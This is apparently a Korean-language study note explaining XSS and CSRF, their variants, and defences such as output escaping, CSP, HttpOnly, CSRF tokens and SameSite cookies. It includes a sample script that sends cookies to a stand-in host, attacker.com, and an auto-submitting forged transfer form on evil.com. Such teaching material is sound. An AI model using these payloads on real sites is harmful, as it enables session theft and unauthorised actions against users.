# XSS / CSRF

## XSS

XSS(Cross-Site Scripting)는 공격자가 **악성 스크립트를 웹 페이지에 삽입해 다른 사용자의 브라우저에서 실행되게 하는 공격**이다.

스크립트가 피해자 브라우저에서 **해당 사이트의 출처로** 실행되기 때문에 SOP의 보호를 받지 못한다. 그래서 쿠키 탈취, 세션 하이재킹, 사용자 대신 요청 보내기, 화면 변조 등이 가능하다.

```html
<!-- 게시글 본문에 이런 내용이 그대로 렌더링되면 -->
<script>
  fetch("https://attacker.com/steal?c=" + document.cookie);
</script>
```

### XSS 종류 (Stored / Reflected / DOM-based)

| 종류 | 스크립트 위치 | 예시 |
| --- | --- | --- |
| Stored XSS | 서버 DB에 저장됨 | 게시글, 댓글, 프로필에 스크립트를 저장 → 그 글을 보는 모든 사용자가 피해 |
| Reflected XSS | 요청 파라미터 → 응답에 그대로 반사 | `/search?q=<script>...</script>` 링크를 피해자가 클릭하도록 유도 |
| DOM-based XSS | 서버를 거치지 않고 클라이언트 JS에서 발생 | `element.innerHTML = location.hash`처럼 URL 값을 그대로 DOM에 삽입 |

- Stored XSS는 한 번 심어두면 불특정 다수가 피해를 입어 가장 위험하다.
- DOM-based XSS는 서버 응답에는 문제가 없어서 서버 측 필터링만으로는 잡히지 않는다.

### XSS 방어 방법

1. **출력 시 이스케이프(인코딩)**: 가장 기본이자 핵심이다. `<`, `>`, `"`, `'`, `&`를 `&lt;`, `&gt;` 등으로 바꿔서 출력하면 브라우저는 이를 태그가 아닌 문자열로 처리한다.
   - Thymeleaf의 `th:text`, React의 `{}` 바인딩은 기본적으로 이스케이프한다.
   - 반대로 `th:utext`, `dangerouslySetInnerHTML`, `innerHTML`은 이스케이프하지 않으므로 사용자 입력에 쓰면 위험하다.
2. **HTML을 허용해야 한다면 Sanitize**: 에디터처럼 HTML 입력이 필요한 경우, 허용 목록(allowlist) 기반 라이브러리(DOMPurify, OWASP Java HTML Sanitizer 등)로 위험한 태그와 속성을 제거한다.
3. **HttpOnly 쿠키**: JS에서 `document.cookie`로 세션 쿠키를 읽지 못하게 해서 XSS가 발생해도 쿠키 탈취는 막는다. (스크립트 실행 자체를 막는 것은 아님)
4. **CSP(Content-Security-Policy)**: 실행 가능한 스크립트의 출처를 응답 헤더로 제한한다. 인라인 스크립트를 금지하면 삽입된 `<script>`가 실행되지 않는다.

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

> 입력 시 필터링보다 **출력 위치에 맞는 인코딩**이 우선이다. 같은 값이라도 HTML 본문, 속성, JS, URL 중 어디에 들어가는지에 따라 필요한 인코딩이 다르다.

## CSRF

CSRF(Cross-Site Request Forgery)는 **사용자가 로그인한 상태를 악용해, 사용자가 의도하지 않은 요청을 보내게 만드는 공격**이다.

공격자는 응답을 읽을 필요가 없다. 요청이 처리되는 것(송금, 비밀번호 변경, 글 작성 등) 자체가 목적이다.

### CSRF 공격 흐름

1. 사용자가 `bank.com`에 로그인해 세션 쿠키를 가지고 있다.
2. 공격자가 만든 `evil.com`에 접속한다.
3. `evil.com`에 숨겨진 폼이 자동으로 `bank.com`에 송금 요청을 보낸다.
4. 브라우저가 `bank.com` 쿠키를 자동으로 실어 보내므로, 서버는 정상 사용자의 요청으로 처리한다.

```html
<!-- evil.com -->
<form action="https://bank.com/transfer" method="POST" id="f">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="1000000" />
</form>
<script>document.getElementById("f").submit();</script>
```

폼 제출은 SOP로 막히지 않고, CORS Simple Request 조건에도 해당하므로 Preflight 없이 바로 전송된다.

CSRF가 성립하려면 다음 조건이 필요하다.

- 인증 정보가 **브라우저에 의해 자동으로 전송**될 것 (쿠키, HTTP Basic 인증 등)
- 요청 파라미터를 공격자가 **미리 예측할 수 있을 것**
- 상태를 바꾸는 요청일 것

그래서 `Authorization` 헤더에 토큰을 직접 넣는 방식은 브라우저가 자동으로 보내지 않으므로 CSRF에 비교적 안전하다.

### CSRF 방어 방법 (CSRF Token / SameSite)

**1. CSRF Token (Synchronizer Token)**

- 서버가 세션마다 예측 불가능한 토큰을 발급해 폼이나 헤더에 담게 한다.
- 요청이 오면 서버가 세션의 토큰과 요청의 토큰을 비교한다.
- 공격자는 SOP 때문에 피해자 페이지의 토큰 값을 읽을 수 없어 위조 요청을 만들 수 없다.
- Spring Security는 기본적으로 CSRF 보호가 켜져 있고 `POST`, `PUT`, `DELETE` 등에 CSRF 토큰을 요구한다.

```html
<form action="/transfer" method="post">
  <input type="hidden" name="_csrf" th:value="${_csrf.token}" />
  ...
</form>
```

**2. SameSite 쿠키**

- 쿠키에 `SameSite` 속성을 지정하면 교차 사이트 요청에 쿠키가 실리지 않게 할 수 있다.
- `Lax`면 다른 사이트에서 시작된 `POST` 요청에는 쿠키가 실리지 않아 위 공격이 막힌다.
- Chrome은 2020년부터 `SameSite`를 지정하지 않은 쿠키를 `Lax`로 취급한다.

**3. 기타**

- `Origin` / `Referer` 헤더 검증: 요청이 우리 사이트에서 왔는지 확인한다.
- 중요한 작업에 재인증(비밀번호 재입력) 요구
- `GET` 요청으로 상태를 바꾸지 않기 (`Lax`는 최상위 `GET` 이동에는 쿠키를 보내기 때문)

## XSS와 CSRF 비교

| | XSS | CSRF |
| --- | --- | --- |
| 공격 방식 | 피해 사이트에 스크립트를 삽입해 실행 | 다른 사이트에서 피해 사이트로 요청을 위조 |
| 실행 위치 | 피해 사이트 출처 (SOP 우회) | 공격자 사이트 |
| 응답 읽기 | 가능 | 불가능 (요청만 보냄) |
| 노리는 것 | 쿠키·토큰 탈취, 임의 동작 | 사용자 권한으로 상태 변경 |
| 주요 방어 | 출력 이스케이프, CSP, HttpOnly | CSRF 토큰, SameSite, Origin 검증 |

- XSS가 뚫리면 공격 스크립트가 같은 출처에서 실행되므로 CSRF 토큰도 읽을 수 있다. 즉 **XSS가 있으면 CSRF 방어는 무력화된다.**
